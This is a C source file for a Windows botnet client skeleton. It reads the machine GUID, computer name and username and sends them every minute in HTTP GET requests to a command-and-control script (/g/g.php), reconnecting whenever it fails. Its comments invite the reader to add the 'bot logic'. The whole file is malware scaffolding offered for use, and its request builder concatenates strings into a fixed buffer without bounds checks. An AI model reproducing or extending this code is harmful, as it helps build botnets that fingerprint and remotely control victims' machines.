
#include "stdafx.h"

/**the bot structure*/
struct HTTPBOT
{
	char bot_id[40];
	char pcname[MAX_COMPUTERNAME_LENGTH + 1];
	char username[UNLEN + 1];
	BOOL IsWow64;
};

/**initializes winsock, true on success.*/
bool InitSocket(void)
{
        WSAData wsdata;
        return (WSAStartup(MAKEWORD(2,0), &wsdata) == NULL); //initialize winsock 2.0
}

/**connects to a Server on specified port, returns the socket.*/
SOCKET ConnectToServer(unsigned short PORT)
{
        SOCKET kSock = socket(AF_INET, SOCK_STREAM, NULL); //create socket
        if(kSock == INVALID_SOCKET) {return INVALID_SOCKET;} //error creating socket?
        sockaddr_in sin;
        sin.sin_port=htons(PORT); //set the socket port
/*
        hostent* HostInfo = gethostbyname("bot.google.com"); //retrieve the ip
        if(HostInfo == NULL) {return INVALID_SOCKET;} //error retrieving ip?
        memcpy(&(sin.sin_addr),HostInfo->h_addr,HostInfo->h_length); //copy the IP from the hostent structure into the sin.sin_add field
*/
		sin.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); //instead of retreiving, use a fixed ip for connection

        sin.sin_family = AF_INET; //connection-type
        if( connect(kSock,(sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR ) {return INVALID_SOCKET;} //connect with kSock and the sin data, on failure return INVALID_SOCKET
        return kSock; //return socket
}
 
/**writes the bot-ID (MachineGuid) into the id string.*/
void GetBotID(char *id, BOOL IsWow64)
{
    REGSAM flag = IsWow64 ? KEY_WOW64_64KEY : KEY_WOW64_32KEY; //os specific (0x200>>IsWow64)
    DWORD BufSize = MAX_PATH;
    DWORD dataType = REG_SZ;
    HKEY hKey;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ | flag, &hKey); //open key
	RegQueryValueEx(hKey, "MachineGuid", NULL, &dataType, (LPBYTE)id, &BufSize); //query machineguid value field
    RegCloseKey(hKey); //close open handle
	
	return;
}

/**writes infos about the pc in the bot structure*/
void initBot(HTTPBOT *bot)
{
	DWORD size;

	IsWow64Process(GetCurrentProcess(), &bot->IsWow64); //running on x64 or x86 windows?

	GetBotID(bot->bot_id, bot->IsWow64); //get ID

	size = MAX_COMPUTERNAME_LENGTH + 1; //size must contain the buffersize
	GetComputerName(bot->pcname, &size); //get Computername, size = max username length

	size = UNLEN + 1;
	GetUserName(bot->username, &size); //get Username

	return;
}

/**send information tick, true on success*/
bool SendInfo(HTTPBOT *bot, SOCKET s)
{
	//final request looks like this: /g/g.php?a=id&b=pcname&c=username
	const char r1[] = "GET /g/g.php"; //strings required to build the HTTP-request
	const char r2[] = " HTTP/1.1\r\nHost: \r\nContent-type: application/x-www-form-urlencoded\r\n\r\n";
	
	const char v1[] = "?a=";
	const char v2[] = "&b=";
	const char v3[] = "&c=";

	char buf[sizeof(r1) + sizeof(r2) + sizeof(v1) + sizeof(v2) + sizeof(v3) + sizeof(HTTPBOT)]; //buffer for the http-request
	memcpy(buf, r1, sizeof(r1)); //write r1 into hte start of buf

#pragma warning(push) //warnings about security... not important
#pragma warning(disable: 4996)
	strcat(buf, v1); //concaternate v1
	strcat(buf, bot->bot_id); //concaternate bot-id...
	strcat(buf, v2);
	strcat(buf, bot->pcname);
	strcat(buf, v3);
	strcat(buf, bot->username);
	strcat(buf, r2); //end of the request
#pragma warning(pop)

	return (send(s, buf, strlen(buf), NULL) >= (int)strlen(buf)); //send request, return true if sendet bytes >= request len. Be aware of strlen when dealing with 0x00 chars / binary data!
}


/**main, the shittiest part of the bot. Here you can play and improve/add things.*/
int main()
{
	HTTPBOT bot; //variables
	SOCKET socket;
	
	initBot(&bot); //write bot structure
	printf("id: %s\nuser: %s@%s\narch: %s\n", bot.bot_id, bot.pcname, bot.username, bot.IsWow64 ? "x64" : "x86"); //if bot.IsWow64 == true write "x64", otherwise "x86"

	InitSocket(); //initialize winsock

	reconnect:
	socket = ConnectToServer(80); //connect on port 80 -> HTTP
	printf("socket %d\n", socket);
	if(socket == INVALID_SOCKET) {closesocket(socket); Sleep(10000); goto reconnect;} //on error sleep 10sec and reconnect

	for(;;) //the right way instead of while(true)
	{
		//here comes the bot logic, I will let this part up to you.
		printf(".");
		if(!SendInfo(&bot, socket)) {closesocket(socket); goto reconnect;} //send bot info request. reconnect in case of failure. apache will interrupt idle connections (after 5+ seconds?), because this is not what webservers are used to :D
		Sleep(60000); //1 min sleep
	}
}
